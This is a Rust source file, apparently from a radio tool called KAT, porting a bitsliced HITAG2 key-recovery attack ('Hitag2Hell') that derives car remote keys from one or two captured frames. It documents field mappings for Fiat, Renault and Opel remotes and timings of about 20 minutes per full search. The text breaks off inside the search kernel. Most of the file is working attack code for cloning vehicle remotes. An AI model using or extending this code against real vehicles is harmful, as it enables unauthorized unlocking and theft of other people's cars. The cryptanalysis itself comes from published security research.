//! HITAG2 key recovery from received remote frames — qDoctor's "Hitag2Hell" engine (CPU path).
//!
//! Port of qDoctor (github.com/thedoctorz/qDoctor, main 7a69dec, GPL-3.0)
//! `lib/modules/cpp/doctor_subghz/`, the C library its app calls over FFI:
//! - `hitag2_bridge.c` `doctor_hitag2hell_recover(hop, uid, cnt, btn, hop2, cnt2, btn2,
//!   has_second, …)` → `hitag2hell_recover_cpu_ex` (the path Linux builds always take; Android,
//!   Windows and Apple try a Vulkan / Metal GPU kernel first).
//! - `hitag2hell_common.c`: the cipher on its bit-reversed register (`hitag2hell_i4`, `_f20`,
//!   `_lfsr`, `_rev16`, `_init`, `_ks`, `_authenticator`), layer 0 (`_expand_taps`, `_layer0`,
//!   `_bitslice_keystream`; `_pack_candidate` only packs candidates into the kernels' 3×16-bit
//!   buffer, KAT passes them as `u64`), state finishing (`_lfsr_inv`, `_finish_state`),
//!   `_equiv_key`, `_try_states` and the driver `_recover_cpu_ex`.
//! - `hitag2hell_kernel.inc` `hitag2hell_find_state` + `hitag2hell_f.inc` (`f_a_bs`, `f_b_bs`,
//!   `f_c_bs`, `lfsr_bs`, `bitslice`, `unbitslice`), compiled for the CPU by
//!   `hitag2hell_cpu_kernel.c`: the 32-way bitsliced guess-and-determine kernel of "Hitag2 Hell"
//!   (Verstegen, Verdult, Bokslag, WOOT 2018; factoritbv/hitag2hell `implementations/opencl.cl`,
//!   also GPL-3.0, NVIDIA `lop3` replaced by portable boolean forms).
//! - `hitag2hell_vulkan.c` `hitag2hell_verify_state` / `hitag2hell_cpu_worker`: the GPU drivers'
//!   per-state check and early stop, which KAT's driver follows (see "Search").
//! - The Dart side (`lib/pages/tools/subghz/workflow/hitag2_sub.dart`,
//!   `hitag2_workflow_controller.dart`): how a capture becomes a request (see "Protocols").
//!
//! Flipper-ARF's L5 (`applications/main/subghz/helpers/subghz_hitag2_hell.c`, ProtoPirate-key
//! cascade `subghz_hitag2_bf.c`) runs the same attack; KAT takes its Fiat V2 IV readings from it.
//!
//! ## The cipher here
//!
//! hitag2hell keeps the 48-bit register reversed relative to [`super::hitag2`]: bit 0 is the
//! oldest bit and the LFSR shifts right, the feedback entering at bit 47. Its 48-bit key is the
//! `Hitag2 Key` field qDoctor writes (`Hitag2Sub.patchingHitag2Key`: the six bytes big-endian),
//! the standard HITAG2 key byte order that [`super::hitag2::renault_authenticator`] takes
//! ([`key_bytes`]); [`super::hitag2::fiat_bcm_authenticator`] takes the same key rotated by two
//! bytes ([`fiat_bcm_key`]). [`authenticator`] equals both (tested), with IV
//! `cnt << 4 | btn & 0xF`.
//!
//! ## The attack
//!
//! The 32-bit hop is the first 32 keystream bits after initialisation, and with the UID and IV
//! known every 48-bit register value after the init rounds corresponds to exactly one key
//! (`hitag2hell_equiv_key`). So recovering a key means finding the register states whose
//! keystream is the hop — about 2^16 of them per hop — and keeping the key that also produces a
//! second frame's hop. The kernel guesses the register bits in the order the filter needs them,
//! one keystream bit per layer, discarding a branch as soon as a filter output disagrees:
//! - layer 0 ([`layer0`]): the 20 taps of the first filter (`HITAG2HELL_LAYER0_MASK`) — the
//!   2^19 patterns whose filter output is the hop's first bit (the filter is balanced, so there
//!   are always [`SEARCH_TOTAL`]);
//! - per candidate, 15 more bits for keystream bit 1: five across the 32 lanes of a word (register
//!   bits 4, 7, 9, 13, 16) and ten in `i1` (bits 18, 22, 24, 27, 30, 32, 35, 45, 47 and the first
//!   LFSR output, bit 48) — 1024 kernel calls;
//! - inside the kernel, loops `i2` (5 bits: 10, 19, 25, 36, 49), `i3` (3: 11, 20, 37) and `i4` …
//!   `i8` (one each: 38 … 42) complete bits 2..=49; keystream bits 9..=31 then only check (the
//!   newer bits are LFSR outputs, `lfsr_bs`).
//!
//! A surviving lane is the register two clocks after initialisation (bits 2..=49); two LFSR
//! inversions give the state ([`finish_state`]), [`equiv_key`] the key, which must reproduce
//! the hop for the UID or its complement (`hitag2hell_try_states` tries both) and, when given,
//! the second frame's hop. One frame leaves ~2^16 equally valid keys; with two, a false key
//! survives with probability ≈ 2^16 states × 2 UID forms × 2^-32 = 2^-15.
//!
//! **Equivalent key.** `hitag2hell_equiv_key` treats the nonce's top 18 bits (Fiat V1's epoch,
//! counter bits ≥ 10) as zero and folds them into the key, while `hitag2hell_authenticator`
//! checks with the full `cnt << 4 | btn`. A request must therefore carry a counter below 1024 —
//! with a larger one nothing ever verifies, exactly as in the C. The key found is the one that
//! works with epoch 0, i.e. the real key whenever the remote's epoch is 0, and an equivalent key
//! that works while the epoch stays the same otherwise.
//!
//! ## Search
//!
//! qDoctor's CPU fallback sweeps every candidate, collects up to `HITAG2HELL_MAX_STATES`
//! (131072) states, then checks them in order (`hitag2hell_recover_cpu_ex` +
//! `hitag2hell_try_states`). Its GPU drivers instead check each state as it is found and stop at
//! the first key that verifies (`hitag2hell_verify_state`, and their CPU assist workers search
//! candidates the same way). KAT does the latter on all cores (std threads; one candidate per
//! work item, claimed in increasing order) but keeps the single-thread C's order: the lowest
//! candidate with a verifying state wins, and within a candidate the states are taken in the
//! kernel's emission order (`i1` → `i2` … `i8` → lane, high lane first), so the result equals the
//! single-thread C's for any thread count. With two frames that is the one key the C finds; with
//! one frame it is the C's first state's key, found after a few candidates instead of after the
//! C's full sweep. On average a hit stops the search halfway.
//!
//! The kernel is generic over the lane word ([`Lanes`]): `u32` is the C's 32-lane word; `u64`
//! and 256-lane `X4` slice the low one / three `i1` bits across lanes too (1024 / 2^n kernel
//! calls per candidate) and read the emission order back from the guessed bits ([`c_order`]).
//! The search uses `X4`, compiled for AVX2 when the CPU has it (runtime detection, as in
//! `keeloq_bf.rs`). Timings: see "Cost".
//!
//! Differences from the C, none of which changes a result the C can return:
//! - Early stop (above); the C's 131072-state cap is gone (states are not kept; a hop has
//!   ~2^16 of them).
//! - The second frame's button is used as given. The C replaces `btn2 == 0` by `btn` (an FFI
//!   sentinel; qDoctor's Dart always passes the second capture's button), which would mis-check a
//!   second Renault V1 frame with button 0 (Sync).
//! - [`recover_key_any`] checks several IV readings of the same frames in one sweep (the kernel
//!   only depends on the hop); qDoctor runs one reading per search.
//!
//! ## Protocols ([`frame_of`], [`requests_for`])
//!
//! qDoctor offers the attack for Fiat V1, Fiat V2 and Renault V1 key files
//! (`Hitag2Sub.parse`, `Hitag2Proto`), with two captures of one remote ("Second file must use
//! the same UID", same protocol), and for Renault V1 first runs the serial-derived seed search
//! (`doctor_hitag2_bcm_recover`, KAT's [`super::hitag2::renault_seed_recover`]):
//!
//! | KAT protocol | uid | hop | cnt | btn | source |
//! |---|---|---|---|---|---|
//! | Fiat V1 | raw\[2..6\] | raw\[7\]&3 ‖ raw\[8..11\] ‖ raw\[11\]>>2 | raw\[6\]&0xF ‖ raw\[7\]>>2 (10 bits) | raw\[6\]>>4 | `_parseFiatRaw` |
//! | Renault V1 | same 13-byte frame | same | same | same | `_parseRenaultV1Frame` |
//! | Fiat V2 | raw\[2..6\] | raw\[10..14\] (FCA) / raw\[9..13\] | 14 / 11-bit counter | raw\[7\]>>6 | `_parseFiatV2Raw` |
//!
//! - Fiat V1 / Renault V1 (both 104-bit frames `00 01 uid btn/cnt hop tail xor`): exactly qDoctor's
//!   fields. A Renault V1 frame the seed search recovers is refused (its key is serial-derived and
//!   KAT already transmits it). Fiat V1 and Renault V1 frames may be paired (same frame and
//!   cipher; `IMPORTS/OPEL/Opel Vectra 2008.sub` decodes one remote under both names).
//! - Fiat V2: qDoctor passes the raw selector and the full 11/14-bit counter, which never verifies
//!   once the counter reaches 1024 (see "Equivalent key"). KAT uses Flipper-ARF's 10-bit counter
//!   (`fiat_v2_iv_control`) with both of its button readings (`fiat_v2_iv_button`: the selector —
//!   qDoctor's reading whenever qDoctor's can verify — or its one-hot remap), in one sweep. ARF's
//!   complemented-counter readings are not tried: the cipher XORs IV and key bits, so they equal
//!   the plain ones with the key XOR `0x3FF << 4`, and likewise the two button readings give
//!   equivalent keys when both presses use the same button (the selector reading then wins): such
//!   a key is proven for that button only. No reference has confirmed Fiat V2's IV against a real
//!   key.
//! - Not mapped: Renault V1 (ARF) (82-bit type-table frames: no fixed 32-bit hop — ARF guesses three
//!   slices — and a 24-bit serial instead of a 32-bit UID; KAT does not port ARF's hop model, see
//!   `renault_v1_arf.rs`) and Datsun Lada (its key is fixed: 0x4606 + the serial, nothing to
//!   recover).
//!
//! ## Verification
//!
//! Against qDoctor's unmodified C (main 7a69dec: `hitag2hell_common.c`, `_cpu_kernel.c`,
//! `_kernel.inc`, `_f.inc`, `hitag2_bridge.c`) built with gcc -O2, with and without OpenMP, plus a
//! harness that includes `hitag2hell_common.c` for its static helpers:
//! - The kernel's schedule (every sub-filter, LFSR bit and guess, in order and at the same loop
//!   level, 227 steps) was compared mechanically with `hitag2hell_kernel.inc`.
//! - Tests (fast): `hitag2hell_authenticator` / `_init` vectors and equality with
//!   [`super::hitag2`]'s two authenticators; f_a/f_b/f_c against f20's tables; `_layer0` (count,
//!   first / last / 1000th candidate, FNV over all 524288) for a hop of each first bit;
//!   `_lfsr_inv`, `_finish_state`, `_equiv_key` vectors; the kernel's matches, in C order, for
//!   four candidates (incl. two with two matches each) and every lane word; end-to-end recovery on
//!   the true candidate of known keys, and through the protocol mapping.
//! - Tests (`#[ignore]`, release): 7680 strided candidates of two hops match the C's
//!   per-candidate lists exactly (`kernel_matches_c_on_strided_samples`); full recoveries
//!   (qDoctor's own sample, known keys, the Opel Vectra capture) and a full sweep's match count.
//!
//! ## Cost
//!
//! A full search is 2^19 candidates × 1024 kernel calls. Measured on an i9-9980HK (8 cores / 16
//! threads, fixed 2.4 GHz), release build, the same candidate samples for every row (hop
//! F003694F, every 1024th candidate on one thread, every 128th on all cores: the test
//! `bench_lane_widths` and the C oracle's `kstride` mode):
//!
//! | kernel | one thread | full sweep | 16 threads | full sweep |
//! |---|---|---|---|---|
//! | qDoctor C, gcc -O2 (32 lanes) | 61.6 ms/candidate | 9.0 h | 152 candidates/s (OpenMP) | 57 min |
//! | KAT `u32` (the C's word) | 54.4 ms | 7.9 h | 167/s | 52 min |
//! | KAT `u64` | 53.9 ms | 7.9 h | 172/s | 51 min |
//! | KAT `X4`, SSE2 | 48.8 ms | 7.1 h | 171/s | 51 min |
//! | KAT `X4`, AVX2 (what the search uses) | 23.0 ms | 3.4 h | 429/s | 20 min |
//!
//! Wider words pay less than their width: after a few keystream bits most lanes of a word are
//! dead, and the deep levels, which dominate, cost one block per surviving partial state
//! whatever the width. Only AVX2's single-instruction 256-bit operations win (2.4× the `u32` word
//! on one thread, 2.6× on all cores; 2.8× the C). With two frames the search stops at the true
//! candidate: half a sweep on average, a full one at worst (19–21 min here, depending on the hop).
//! Measured: qDoctor's own sample request (state at candidate 477304 of 524288) in 1050 s, where
//! qDoctor's C took 3358 s on 16 OpenMP threads (its CPU path always sweeps everything); the Opel
//! Vectra capture's first two presses in about 17 min.

use std::ops::{BitAnd, BitOr, BitXor, Not, Range};
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::sync::Mutex;

use super::hitag2;
use super::DecodedSignal;

/// Low 48 bits.
const MASK48: u64 = (1 << 48) - 1;
/// `HITAG2HELL_LAYER0_MASK`: the 20 filter taps of the first keystream bit.
const LAYER0_MASK: u64 = 0x5806_B4A2_D16C;
/// `HITAG2HELL_I1_SPAN`: kernel calls per candidate in the C (one per `i1`).
const I1_SPAN: u32 = 1024;
/// Layer-0 candidates of every hop: the 2^20 tap patterns whose filter output is the hop's first
/// bit (the filter is balanced). The denominator of [`BruteForceControl::progress`].
pub const SEARCH_TOTAL: u32 = 1 << 19;

// ---------------------------------------------------------------------------------------------
// Cipher on hitag2hell's register (hitag2hell_common.c)
// ---------------------------------------------------------------------------------------------

/// `hitag2hell_i4`: bits a, b, c, d of `x` as a 4-bit index (a = MSB).
#[inline(always)]
fn i4(x: u64, a: u32, b: u32, c: u32, d: u32) -> u32 {
    ((((x >> a) & 1) << 3) | (((x >> b) & 1) << 2) | (((x >> c) & 1) << 1) | ((x >> d) & 1)) as u32
}

/// `hitag2hell_f20`: the HITAG2 filter (bit 0 = oldest register bit).
#[inline(always)]
fn f20(state: u64) -> u64 {
    let s0 = (0x3C65u32 >> i4(state, 2, 3, 5, 6)) & 1;
    let s1 = (0x0EE5u32 >> i4(state, 8, 12, 14, 15)) & 1;
    let s2 = (0x0EE5u32 >> i4(state, 17, 21, 23, 26)) & 1;
    let s3 = (0x0EE5u32 >> i4(state, 28, 29, 31, 33)) & 1;
    let s4 = (0x3C65u32 >> i4(state, 34, 43, 44, 46)) & 1;
    ((0x0DD3_929Bu32 >> ((s0 << 4) | (s1 << 3) | (s2 << 2) | (s3 << 1) | s4)) & 1) as u64
}

/// `hitag2hell_lfsr`: one LFSR clock (taps 0 2 3 6 7 8 16 22 23 26 30 41 42 43 46 47).
#[inline(always)]
fn lfsr(state: u64) -> u64 {
    let fb = (state
        ^ (state >> 2)
        ^ (state >> 3)
        ^ (state >> 6)
        ^ (state >> 7)
        ^ (state >> 8)
        ^ (state >> 16)
        ^ (state >> 22)
        ^ (state >> 23)
        ^ (state >> 26)
        ^ (state >> 30)
        ^ (state >> 41)
        ^ (state >> 42)
        ^ (state >> 43)
        ^ (state >> 46)
        ^ (state >> 47))
        & 1;
    (state >> 1) | (fb << 47)
}

/// `hitag2hell_rev16`: the low 16 bits reversed.
fn rev16(x: u64) -> u64 {
    (x as u16).reverse_bits() as u64
}

/// `hitag2hell_init`: the register after the 32 init rounds — key bits 47..32 and the UID
/// loaded, then `f20 ^ nonce bit ^ key bit` clocked in (nonce = `counter << 4 | button`, both
/// MSB first).
fn init(key: u64, uid: u32, counter: u32, button: u8) -> u64 {
    let nonce = (counter << 4) | (button as u32 & 0x0F);
    let mut state = 0u64;
    for i in 32..48 {
        state = (state << 1) | ((key >> i) & 1);
    }
    for i in 0..32 {
        state = (state << 1) | ((uid >> i) & 1) as u64;
    }
    for i in 0..32 {
        let nonce_bit = f20(state) ^ ((nonce >> (31 - i)) & 1) as u64;
        state = (state >> 1) | (((nonce_bit ^ ((key >> (31 - i)) & 1)) & 1) << 47);
    }
    state
}

/// `hitag2hell_ks`: 32 keystream bits from `state` (first bit = MSB).
fn ks(mut state: u64) -> u32 {
    let mut c = 0u32;
    for _ in 0..32 {
        c = (c << 1) | f20(state) as u32;
        state = lfsr(state);
    }
    c
}

/// `hitag2hell_authenticator`: the hop a remote with this 48-bit key sends for `(uid, cnt, btn)`
/// (= [`super::hitag2::renault_authenticator`] with [`key_bytes`]`(key)`).
pub fn authenticator(key: u64, uid: u32, cnt: u32, btn: u8) -> u32 {
    ks(init(key, uid, cnt, btn))
}

/// `hitag2hell_expand_taps`: deposit the 20 bits of `index20` on the layer-0 taps.
fn expand_taps(index20: u32) -> u64 {
    let mut fill = 0u64;
    let mut mask = LAYER0_MASK;
    let mut value = index20 as u64;
    for bit in 0..48 {
        if mask & 1 == 1 {
            fill |= (value & 1) << bit;
            value >>= 1;
        }
        mask >>= 1;
    }
    fill
}

/// `hitag2hell_layer0`: the tap patterns (ascending) whose filter output is the hop's first bit,
/// as 46-bit candidates (register bits 2..=47; the taps never touch bits 0 and 1).
/// `expand_taps` is a bit deposit, so it is evaluated as two 10-bit table halves.
fn layer0(hop: u32) -> Vec<u64> {
    let want = (hop >> 31) as u64;
    let lo: Vec<u64> = (0..1u32 << 10).map(expand_taps).collect();
    let hi: Vec<u64> = (0..1u32 << 10).map(|h| expand_taps(h << 10)).collect();
    let mut out = Vec::with_capacity(SEARCH_TOTAL as usize);
    for i0 in 0..1usize << 20 {
        let state0 = lo[i0 & 0x3FF] | hi[i0 >> 10];
        if f20(state0) == want {
            out.push(state0 >> 2);
        }
    }
    out
}

/// `hitag2hell_lfsr_inv`: one LFSR clock backwards (recovers the oldest bit).
pub fn lfsr_inv(state: u64) -> u64 {
    let poly = (0xCE00_44C1_01CDu64 >> 1) | (1 << 47);
    let parity = ((state & poly).count_ones() & 1) as u64;
    ((state << 1) | parity) & MASK48
}

/// `hitag2hell_finish_state`: a kernel match (register bits 2..=49) back to the register after
/// the init rounds.
fn finish_state(raw: u64) -> u64 {
    lfsr_inv(lfsr_inv(raw & MASK48)) & MASK48
}

/// `hitag2hell_equiv_key`: the key that leaves the register at `init` after the init rounds
/// for `(uid, cnt, btn)`, with nonce bits 31..14 taken as zero (see the module doc).
fn equiv_key(init: u64, uid: u32, cnt: u32, btn: u8) -> u64 {
    let key_hi16 = rev16(init & 0xFFFF);
    let key = key_hi16 << 32;
    let mut state = 0u64;
    for i in 32..48 {
        state = (state << 1) | ((key >> i) & 1);
    }
    for i in 0..32 {
        state = (state << 1) | ((uid >> i) & 1) as u64;
    }
    let nonce = (cnt << 4) | (btn as u32 & 0x0F);
    let mut key_lo = 0u64;
    for i in 0..32 {
        let inj = (init >> (16 + i)) & 1;
        let f = f20(state);
        let nbit = if i < 18 { 0 } else { ((nonce >> (31 - i)) & 1) as u64 };
        key_lo |= (inj ^ f ^ nbit) << (31 - i);
        state = (state >> 1) | (inj << 47);
    }
    (key | key_lo) & MASK48
}

/// The six key bytes in the standard HITAG2 order: qDoctor's / doctor-firmware's `Hitag2 Key`
/// line and the key of [`super::hitag2::renault_authenticator`].
pub fn key_bytes(key: u64) -> [u8; 6] {
    let b = key.to_be_bytes();
    [b[2], b[3], b[4], b[5], b[6], b[7]]
}

/// The key as [`super::hitag2::fiat_bcm_authenticator`] (ProtoPirate's Fiat V1 key order, KAT's
/// Fiat V1 / V2 key lists) takes it: the standard order rotated by two bytes.
pub fn fiat_bcm_key(key: u64) -> [u8; 6] {
    let r = key_bytes(key);
    [r[2], r[3], r[4], r[5], r[0], r[1]]
}

// ---------------------------------------------------------------------------------------------
// Requests and the per-state check (hitag2hell_try_states / hitag2hell_verify_state)
// ---------------------------------------------------------------------------------------------

/// A second frame of the same remote (another press), used to single out the key.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct SecondFrame {
    pub hop: u32,
    pub cnt: u32,
    pub btn: u8,
}

/// qDoctor's `Hitag2HellRequest`: a frame's hop, UID, counter and button (IV `cnt << 4 | btn`),
/// plus an optional second frame. `cnt` must be below 1024 (module doc, "Equivalent key").
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Hitag2Request {
    pub hop: u32,
    pub uid: u32,
    pub cnt: u32,
    pub btn: u8,
    pub second: Option<SecondFrame>,
}

/// A recovered key (`Hitag2HellResult`).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct RecoveredKey {
    /// The 48-bit key, standard byte order (see [`key_bytes`], [`fiat_bcm_key`]).
    pub key: u64,
    /// The UID it verifies with: the request's, or its complement (the C tries both).
    pub uid: u32,
    /// The register after the init rounds of the first frame.
    pub state: u64,
    /// Index of the request that verified (always 0 for [`recover_key`]).
    pub request: usize,
    /// The layer-0 candidate the state was found under.
    pub candidate: u32,
}

/// `hitag2hell_try_states` for one kernel match: the key of the state, for the UID then its
/// complement, that reproduces the hop and (if given) the second frame's hop.
fn verify_state(req: &Hitag2Request, raw: u64) -> Option<(u64, u32, u64)> {
    let init = finish_state(raw);
    for uid in [req.uid, !req.uid] {
        let key = equiv_key(init, uid, req.cnt, req.btn);
        if authenticator(key, uid, req.cnt, req.btn) != req.hop {
            continue;
        }
        if let Some(p) = req.second {
            if authenticator(key, uid, p.cnt, p.btn) != p.hop {
                continue;
            }
        }
        return Some((key, uid, init));
    }
    None
}

// ---------------------------------------------------------------------------------------------
// Bitsliced kernel (hitag2hell_kernel.inc + hitag2hell_f.inc)
// ---------------------------------------------------------------------------------------------

/// A bitsliced word: bit `j` of every word belongs to lane `j`. Lanes 0..32 are the C's five
/// lane bits; wider words also carry the lowest [`Lanes::EXTRA`] `i1` bits.
trait Lanes:
    Copy + BitAnd<Output = Self> + BitOr<Output = Self> + BitXor<Output = Self> + Not<Output = Self>
{
    /// `i1` bits carried by lanes (log2(lanes) - 5).
    const EXTRA: u32;
    /// `HITAG2HELL_NEGBOOL`.
    fn splat(bit: bool) -> Self;
    /// Lane `j` holds bit `i` of `j`.
    fn index_bit(i: u32) -> Self;
    fn any(self) -> bool;
    /// Bit of lane `lane` (0 or 1).
    fn lane(self, lane: u32) -> u64;
    /// Every set lane (the `u32` word goes high to low, as the C's `clz` loop does).
    fn for_each_set(self, f: impl FnMut(u32));
}

/// Lane `j` holds bit `i` of `j`, for the six bits of a 64-lane word (the C's 32-lane patterns
/// 0xaaaaaaaa … 0xffff0000 are the low halves of the first five).
const LANE_BITS: [u64; 6] = [
    0xAAAA_AAAA_AAAA_AAAA,
    0xCCCC_CCCC_CCCC_CCCC,
    0xF0F0_F0F0_F0F0_F0F0,
    0xFF00_FF00_FF00_FF00,
    0xFFFF_0000_FFFF_0000,
    0xFFFF_FFFF_0000_0000,
];

impl Lanes for u32 {
    const EXTRA: u32 = 0;
    #[inline(always)]
    fn splat(bit: bool) -> Self {
        if bit {
            !0
        } else {
            0
        }
    }
    #[inline(always)]
    fn index_bit(i: u32) -> Self {
        LANE_BITS[i as usize] as u32
    }
    #[inline(always)]
    fn any(self) -> bool {
        self != 0
    }
    #[inline(always)]
    fn lane(self, lane: u32) -> u64 {
        ((self >> lane) & 1) as u64
    }
    fn for_each_set(self, mut f: impl FnMut(u32)) {
        let mut m = self;
        while m != 0 {
            let lane = 31 - m.leading_zeros();
            f(lane);
            m &= !(1 << lane);
        }
    }
}

impl Lanes for u64 {
    const EXTRA: u32 = 1;
    #[inline(always)]
    fn splat(bit: bool) -> Self {
        if bit {
            !0
        } else {
            0
        }
    }
    #[inline(always)]
    fn index_bit(i: u32) -> Self {
        LANE_BITS[i as usize]
    }
    #[inline(always)]
    fn any(self) -> bool {
        self != 0
    }
    #[inline(always)]
    fn lane(self, lane: u32) -> u64 {
        (self >> lane) & 1
    }
    fn for_each_set(self, mut f: impl FnMut(u32)) {
        let mut m = self;
        while m != 0 {
            f(m.trailing_zeros());
            m &= m - 1;
        }
    }
}

/// 256 lanes in four 64-bit words (one AVX2 register; two SSE2 / NEON registers): lane `j` is
/// bit `j % 64` of word `j / 64`.
#[derive(Clone, Copy)]
#[repr(align(32))]
struct X4([u64; 4]);

macro_rules! x4_op {
    ($tr:ident, $f:ident, $op:tt) => {
        impl $tr for X4 {
            type Output = X4;
            #[inline(always)]
            fn $f(self, o: X4) -> X4 {
                X4([self.0[0] $op o.0[0], self.0[1] $op o.0[1], self.0[2] $op o.0[2], self.0[3] $op o.0[3]])
            }
        }
    };
}
x4_op!(BitAnd, bitand, &);
x4_op!(BitOr, bitor, |);
x4_op!(BitXor, bitxor, ^);

impl Not for X4 {
    type Output = X4;
    #[inline(always)]
    fn not(self) -> X4 {
        X4([!self.0[0], !self.0[1], !self.0[2], !self.0[3]])
    }
}

impl Lanes for X4 {
    const EXTRA: u32 = 3;
    #[inline(always)]
    fn splat(bit: bool) -> Self {
        X4([u64::splat(bit); 4])
    }
    #[inline(always)]
    fn index_bit(i: u32) -> Self {
        match i {
            0..=5 => X4([LANE_BITS[i as usize]; 4]),
            6 => X4([0, !0, 0, !0]),
            _ => X4([0, 0, !0, !0]),
        }
    }
    #[inline(always)]
    fn any(self) -> bool {
        (self.0[0] | self.0[1] | self.0[2] | self.0[3]) != 0
    }
    #[inline(always)]
    fn lane(self, lane: u32) -> u64 {
        (self.0[(lane / 64) as usize] >> (lane % 64)) & 1
    }
    fn for_each_set(self, mut f: impl FnMut(u32)) {
        for (w, &word) in self.0.iter().enumerate() {
            word.for_each_set(|b| f(w as u32 * 64 + b));
        }
    }
}

/// `f_a_bs`: filter groups 0 and 4 (table 0x3C65 on hitag2hell's register).
#[inline(always)]
fn f_a<W: Lanes>(a: W, b: W, c: W, d: W) -> W {
    !(((a | b) & c) ^ (a | d) ^ b)
}

/// `f_b_bs`: filter groups 1..3 (table 0xEE5).
#[inline(always)]
fn f_b<W: Lanes>(a: W, b: W, c: W, d: W) -> W {
    !(((d | c) & (a ^ b)) ^ (d | a | b))
}

/// `f_c_bs`: the output function over the five groups (table 0xDD3929B).
#[inline(always)]
fn f_c<W: Lanes>(a: W, b: W, c: W, d: W, e: W) -> W {
    !((((((c ^ e) | d) & a) ^ b) & (c ^ b)) ^ (((d ^ e) | a) & ((d ^ b) | c)))
}

/// The kernel's register: `s[n]` = bitsliced register bit `n` (the C's `state[-2 + n]`; bits 0
/// and 1 are never set or read), up to bit 77 (keystream bit 31's newest tap).
type Bits<W> = [W; 80];

/// Group 0 of the filter for keystream bit `t` (`filter<t>_0`, taps t+2 t+3 t+5 t+6).
#[inline(always)]
fn g0<W: Lanes>(s: &Bits<W>, t: usize) -> W {
    f_a(s[t + 2], s[t + 3], s[t + 5], s[t + 6])
}

/// `filter<t>_1` (taps t+8 t+12 t+14 t+15).
#[inline(always)]
fn g1<W: Lanes>(s: &Bits<W>, t: usize) -> W {
    f_b(s[t + 8], s[t + 12], s[t + 14], s[t + 15])
}

/// `filter<t>_2` (taps t+17 t+21 t+23 t+26).
#[inline(always)]
fn g2<W: Lanes>(s: &Bits<W>, t: usize) -> W {
    f_b(s[t + 17], s[t + 21], s[t + 23], s[t + 26])
}

/// `filter<t>_3` (taps t+28 t+29 t+31 t+33).
#[inline(always)]
fn g3<W: Lanes>(s: &Bits<W>, t: usize) -> W {
    f_b(s[t + 28], s[t + 29], s[t + 31], s[t + 33])
}

/// `filter<t>_4` (taps t+34 t+43 t+44 t+46).
#[inline(always)]
fn g4<W: Lanes>(s: &Bits<W>, t: usize) -> W {
    f_a(s[t + 34], s[t + 43], s[t + 44], s[t + 46])
}

/// `lfsr_bs(i)`: register bit `i + 48`, the LFSR output after bits `i .. i + 48`.
#[inline(always)]
fn lfsr_bs<W: Lanes>(s: &Bits<W>, i: usize) -> W {
    s[i] ^ s[i + 2]
        ^ s[i + 3]
        ^ s[i + 6]
        ^ s[i + 7]
        ^ s[i + 8]
        ^ s[i + 16]
        ^ s[i + 22]
        ^ s[i + 23]
        ^ s[i + 26]
        ^ s[i + 30]
        ^ s[i + 41]
        ^ s[i + 42]
        ^ s[i + 43]
        ^ s[i + 46]
        ^ s[i + 47]
}

/// `HITAG2HELL_NEGBOOL(v & (1 << k))`.
#[inline(always)]
fn guess<W: Lanes>(v: u32, k: u32) -> W {
    W::splat((v >> k) & 1 == 1)
}

/// The `i1` register bits, `i1` bit 0 first (bit 48 is the C's "guess lfsr output 0").
const I1_BITS: [usize; 10] = [18, 22, 24, 27, 30, 32, 35, 45, 47, 48];

/// `hitag2hell_bitslice_keystream` for word type `W`: keystream bit `i` (hop bit 31 - i) as an
/// all-zero word when it is 1 and all-ones when it is 0, so `filter ^ ks[i]` marks the agreeing
/// lanes.
fn bitslice_keystream<W: Lanes>(hop: u32) -> [W; 32] {
    std::array::from_fn(|i| W::splat((hop >> (31 - i)) & 1 == 0))
}

/// `hitag2hell_find_state` for one candidate and one `i1` (for wider words: the `1 << EXTRA`
/// values `i1 .. i1 + (1 << EXTRA)`, `i1` a multiple of that): pushes every register (bits 2..=49,
/// `unbitslice(&state[-2+2], lane, 48)`) whose 32 keystream bits are the hop. Structure, loop
/// order and the level each sub-filter is computed at are the C's.
#[inline(always)]
fn find_state<W: Lanes>(ks: &[W; 32], candidate: u64, i1: u32, out: &mut Vec<u64>) {
    let mut s: Bits<W> = [W::splat(false); 80];
    // bitslice(&state[-2+2], candidate, 46): register bits 2..=47.
    for (k, word) in s[2..48].iter_mut().enumerate() {
        *word = W::splat((candidate >> k) & 1 == 1);
    }
    // Lane bits ("set bits 3, 6, 8, 12, 15" + 1).
    s[4] = W::index_bit(0);
    s[7] = W::index_bit(1);
    s[9] = W::index_bit(2);
    s[13] = W::index_bit(3);
    s[16] = W::index_bit(4);
    for (b, &n) in I1_BITS.iter().enumerate() {
        let b = b as u32;
        s[n] = if b < W::EXTRA { W::index_bit(5 + b) } else { guess(i1, b) };
    }
    let filter1 = f_c(g0(&s, 1), g1(&s, 1), g2(&s, 1), g3(&s, 1), g4(&s, 1));
    let results1 = filter1 ^ ks[1];
    if !results1.any() {
        return;
    }
    let filter2_0 = g0(&s, 2);
    let filter2_3 = g3(&s, 2);
    let filter3_0 = g0(&s, 3);
    let filter5_2 = g2(&s, 5);
    let filter6_2 = g2(&s, 6);
    let filter7_2 = g2(&s, 7);
    let filter9_1 = g1(&s, 9);
    let filter9_2 = g2(&s, 9);
    let filter10_0 = g0(&s, 10);
    let filter11_0 = g0(&s, 11);
    let filter12_0 = g0(&s, 12);
    let filter14_1 = g1(&s, 14);
    let filter15_1 = g1(&s, 15);
    let filter15_3 = g3(&s, 15);
    let filter16_1 = g1(&s, 16);
    for i2 in 0..1u32 << 5 {
        s[10] = guess(i2, 0);
        s[19] = guess(i2, 1);
        s[25] = guess(i2, 2);
        s[36] = guess(i2, 3);
        s[49] = guess(i2, 4); // guess lfsr output 1
        let filter2 = f_c(filter2_0, g1(&s, 2), g2(&s, 2), filter2_3, g4(&s, 2));
        let results2 = results1 & (filter2 ^ ks[2]);
        if !results2.any() {
            continue;
        }
        s[50] = lfsr_bs(&s, 2);
        let filter3_3 = g3(&s, 3);
        let filter4_0 = g0(&s, 4);
        let filter4_1 = g1(&s, 4);
        let filter4_2 = g2(&s, 4);
        let filter7_0 = g0(&s, 7);
        let filter7_1 = g1(&s, 7);
        let filter8_2 = g2(&s, 8);
        let filter10_1 = g1(&s, 10);
        let filter10_2 = g2(&s, 10);
        let filter11_1 = g1(&s, 11);
        let filter13_0 = g0(&s, 13);
        let filter13_1 = g1(&s, 13);
        let filter16_0 = g0(&s, 16);
        let filter16_3 = g3(&s, 16);
        let filter17_1 = g1(&s, 17);
        let filter17_3 = g3(&s, 17);
        for i3 in 0..1u32 << 3 {
